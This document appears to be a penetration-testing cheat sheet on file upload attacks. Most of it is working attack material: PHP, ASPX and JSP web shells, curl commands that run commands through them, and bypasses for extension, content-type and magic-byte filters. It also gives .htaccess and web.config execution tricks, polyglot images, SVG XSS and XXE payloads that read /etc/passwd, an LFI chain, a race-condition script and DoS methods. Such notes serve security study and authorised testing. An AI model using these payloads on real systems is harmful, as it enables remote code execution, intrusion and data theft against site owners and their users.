# File Upload Attacks

#FileUpload #WebSecurity #RCE #WebShell #MIME #ContentType

## What is this?

File upload endpoints that fail to validate file type, content, or name allow attackers to upload web shells for RCE, malicious files for client-side attacks (XSS/XXE), or DoS payloads. Goal: get server-side code execution, or escalate impact through secondary techniques (LFI+upload, polyglots, EXIF payloads).

---

## Tools

| Tool | Purpose |
|---|---|
| `ffuf` / `Burp Intruder` | Fuzz extensions, content-types, filenames |
| `Burp Suite` | Intercept and modify upload requests |
| `Turbo Intruder` | Race condition exploitation |
| `exiftool` | Inject payloads into image EXIF metadata |
| `file` | Check magic bytes of a file |
| `ExifTool` / `hexedit` | Embed PHP/polyglot into image headers |

---

## Shell Payloads

### PHP

```php
<!-- Minimal one-liners -->
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo exec($_REQUEST['cmd']); ?>

<!-- POST-based (cleaner logs) -->
<?php system($_POST['cmd']); ?>

<!-- Read file -->
<?php echo file_get_contents('/etc/passwd'); ?>
<?php echo file_get_contents('/flag.txt'); ?>
```

Upload `shell.php`, then:
```bash
curl http://target.com/uploads/shell.php?cmd=id
curl http://target.com/uploads/shell.php?cmd=cat+/etc/passwd
```

Resources:
- [phpbash](https://github.com/Arrexel/phpbash) — semi-interactive PHP shell
- [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) — full reverse shell

### ASPX (.NET)

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
%>
```

### JSP (Java/Tomcat)

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

---

## Attack Flow

```
1. Identify upload endpoint and backend language
2. Try a benign file upload — confirm it works and find the upload path
3. Try a minimal web shell upload directly
4. If blocked → bypass client-side validation
5. If still blocked → bypass server-side filters (extension, content-type, MIME)
6. After upload succeeds → locate the file and trigger execution
7. Escalate: reverse shell, LFI+upload, polyglot, etc.
```

---

## Client-Side Bypass

JS validation runs in the browser — trivially bypassed.

### Method 1: Remove validation in DevTools

```
F12 → Inspector → find <input type="file" accept=".jpg,.png" onchange="validate()">
→ Remove `accept` attribute
→ Remove or clear `onchange` handler (delete validate() call)
→ Upload malicious file through the normal UI
```

### Method 2: Intercept in Burp

```
1. Upload a legitimate file (e.g., image.jpg)
2. Intercept the upload request in Burp Proxy
3. In the request body, change:
   - Filename: "image.jpg" → "shell.php"
   - File content: replace image bytes with PHP shell
   - Content-Type: image/jpeg → application/x-php (or leave as is)
4. Forward request
```

---

## Blacklist Bypass (Extension Filtering)

Server blocks specific extensions (`.php`, `.asp`, etc.) — try alternatives.

### PHP alternatives

```
.php .php2 .php3 .php4 .php5 .php6 .php7 .php8
.pht .phar .phtm .phtml .phps .pgif .shtml
.inc .pif .wbmp
```

### ASP alternatives

```
.asp .aspx .config .cer .asa .asax .ascx .ashx .axd .asmx
```

### Fuzz extensions with ffuf

```bash
# Download extension wordlist
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-extensions.txt

# Upload a file with each extension and look for non-blocked responses
ffuf -u http://target.com/upload.php \
  -X POST \
  -F "file=@shell.FUZZ;type=image/jpeg" \
  -F "submit=Upload" \
  -w web-extensions.txt \
  -mc 200 -fs <blocked_response_size>
```

### Fuzz with Burp Intruder

```
1. Capture upload request in Burp → Send to Intruder
2. Mark the extension in the filename as payload position:
   Content-Disposition: form-data; name="file"; filename="shell.§php§"
3. Payload: Simple list → paste PHP/ASP extension list
4. Start attack → sort by Response length to find anomalies
```

---

## Whitelist Bypass

Server only allows specific extensions — trick it into accepting executable files.

### Double Extension

```
shell.jpg.php     → if server stops at first extension (jpg)
shell.php.jpg     → if server executes on first extension, ignores last
shell.php%00.jpg  → null byte — truncates at %00 (older PHP/servers)
```

### Character Injection

Inject special chars between extensions to confuse filter:

```
%20  %0a  %00  %0d0a  /  .\  .  …  :
```

Generate a wordlist automatically:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '...' ':'; do
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' \
               '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell${char}${ext}.jpg" >> upload_wordlist.txt
        echo "shell${ext}${char}.jpg" >> upload_wordlist.txt
        echo "shell.jpg${char}${ext}" >> upload_wordlist.txt
        echo "shell.jpg${ext}${char}" >> upload_wordlist.txt
    done
done
```

Fuzz with generated list:

```bash
ffuf -u http://target.com/upload.php \
  -X POST \
  -F "file=@shell.FUZZ;type=image/jpeg" \
  -w upload_wordlist.txt \
  -mc 200 -fs <blocked_size>
```

### .htaccess Upload (Apache)

If `.htaccess` can be uploaded, force Apache to execute a custom extension as PHP:

```apache
# Upload this as .htaccess
AddType application/x-httpd-php .jpg
```

Then upload `shell.jpg` containing PHP code — Apache executes it.

### web.config Upload (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Execute(oScript.exec(Request("cmd")).StdOut.Readall())
%>
```

---

## Content-Type Bypass

Server checks the `Content-Type` header in the request.

### Manual

In Burp — change the header in the upload request:
```
Content-Type: application/x-php
→ change to →
Content-Type: image/jpeg
```

### Fuzz Content-Type with ffuf

```bash
# Get content-type list
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-all-content-types.txt

# Extract image content types only
grep 'image/' web-all-content-types.txt > image-content-types.txt

# Fuzz
ffuf -u http://target.com/upload.php \
  -X POST \
  -F "file=@shell.php;type=FUZZ" \
  -w image-content-types.txt \
  -mc 200 -fs <blocked_size>
```

---

## MIME-Type Bypass (Magic Bytes)

Server reads actual file content to determine type. Prepend magic bytes to fool it.

| Format | Magic bytes (text) | Hex |
|---|---|---|
| GIF | `GIF8` | `47 49 46 38` |
| PNG | `\x89PNG` | `89 50 4E 47` |
| JPG | `\xff\xd8\xff` | `FF D8 FF` |
| PDF | `%PDF` | `25 50 44 46` |

### Add magic bytes to PHP shell

```bash
# Prepend GIF magic bytes — server detects as GIF, executes as PHP
echo 'GIF8' > shell.php.gif
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.gif

# Or with printf for hex bytes
printf '\xff\xd8\xff' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

### Check what file reports

```bash
file shell.php     # "PHP script text"
file shell.php.gif # "GIF image data" (after adding magic bytes)
```

### Add to image using exiftool

```bash
# Inject PHP into EXIF comment of a real image
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg

# Inject XSS payload
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

---

## Limited File Uploads

When you can upload files but they won't be executed — attack what processes/renders them.

### Attack Surface by File Type

| Attack | File Types |
|---|---|
| XSS | HTML, JS, SVG, GIF, JPG (via EXIF) |
| XXE / SSRF | XML, SVG, PDF, PPT, DOC |
| DoS | ZIP, JPG, PNG |

### SVG — XSS

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### SVG — XXE (read local file)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
```

### SVG — XXE via PHP filter (read PHP source)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
```

Decode the base64 response:
```bash
echo "<base64_output>" | base64 -d
```

### EXIF — XSS

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

Then change `Content-Type` to `text/html` in the serve response (or via another vuln) to trigger execution.

---

## Polyglot Files

Valid in multiple formats — bypasses both extension and MIME validation.

```bash
# Create a JPG+PHP polyglot
# Method 1: prepend magic bytes to PHP
printf '\xff\xd8\xff' > polyglot.php
cat shell.php >> polyglot.php

# Method 2: use exiftool to embed PHP in a real JPG
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real.jpg -o polyglot.php

# Method 3: manual hex editor — add PHP to end of valid JPEG
# Many parsers stop at JPEG EOI marker 0xFFD9; append PHP after it
cat real.jpg shell.php > polyglot.php
```

Verify it's detected as JPEG:
```bash
file polyglot.php    # should say JPEG image data
```

---

## Upload Path Discovery

If the upload location isn't disclosed in the response:

```bash
# Try common paths
ffuf -u http://target.com/FUZZ/shell.php \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200

# Common upload dirs
/uploads/ /upload/ /files/ /images/ /img/ /media/ /assets/
/content/ /static/ /data/ /user/ /profile/

# Grep response for path leakage
curl -s -X POST http://target.com/upload.php -F "file=@shell.php" | grep -oP '\/[\w/]+\.php'
```

---

## LFI + Upload Chaining

When direct execution is blocked but LFI exists — upload to a readable path, include via LFI.

```bash
# Step 1: upload shell disguised as image
curl -X POST http://target.com/upload.php \
  -F "file=@shell.php.jpg" \
  -F "Content-Type: image/jpeg"

# Step 2: find the upload path (e.g., /uploads/shell.php.jpg)

# Step 3: include via LFI
curl "http://target.com/page.php?file=../uploads/shell.php.jpg"

# Step 4: pass command
curl "http://target.com/page.php?file=../uploads/shell.php.jpg&cmd=id"
```

---

## Race Condition

Upload a file that gets validated then deleted — execute it in the window between upload and deletion.

```python
# Turbo Intruder — race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)

    # Queue many upload + execute requests simultaneously
    for i in range(20):
        engine.queue(target.req)

    engine.openGate('race1')

def handleResponse(req, interesting):
    if req.status == 200 and 'uid=' in req.response:
        table.add(req)
```

Workflow:
```
1. Intercept upload request → Send to Turbo Intruder
2. Simultaneously: queue upload + GET to the upload path
3. Engine.openGate() fires all requests at once
4. If execution response arrives before deletion → RCE
```

---

## DoS via File Upload

```bash
# Pixel flooding — compressed image with huge dimensions
# Creates a small file that decompresses to massive memory usage
convert -size 0xffff0000 xc:white bomb.png

# Zip bomb — nested archives that expand to huge size
# 42.zip = 42kb → 42 nested layers → 4.5 petabytes uncompressed
# Download: https://www.unforgettable.dk/42.zip

# Large file
dd if=/dev/urandom of=bigfile.bin bs=1M count=1000

# Directory traversal overwrite (if path not sanitized)
# filename: ../../../../../../etc/cron.d/backdoor
```

---

## Checklist

```
[ ] Upload benign file — confirm upload works and find the upload path
[ ] Upload minimal PHP shell directly — check if it executes
[ ] Client-side bypass: remove JS validation, intercept with Burp
[ ] Fuzz extensions with web-extensions.txt (blacklist bypass)
[ ] Try double extension: shell.jpg.php, shell.php.jpg
[ ] Try null byte: shell.php%00.jpg
[ ] Generate char injection wordlist and fuzz
[ ] Change Content-Type to image/jpeg — fuzz full list
[ ] Add GIF8 magic bytes — check if MIME filter bypassed
[ ] Inject PHP into real image via exiftool (polyglot)
[ ] Try .htaccess upload (Apache) / web.config (IIS)
[ ] Discover upload path if not disclosed
[ ] Try LFI+upload chain if LFI exists
[ ] SVG/XXE if image uploads accepted
[ ] Race condition if validation window exists
```
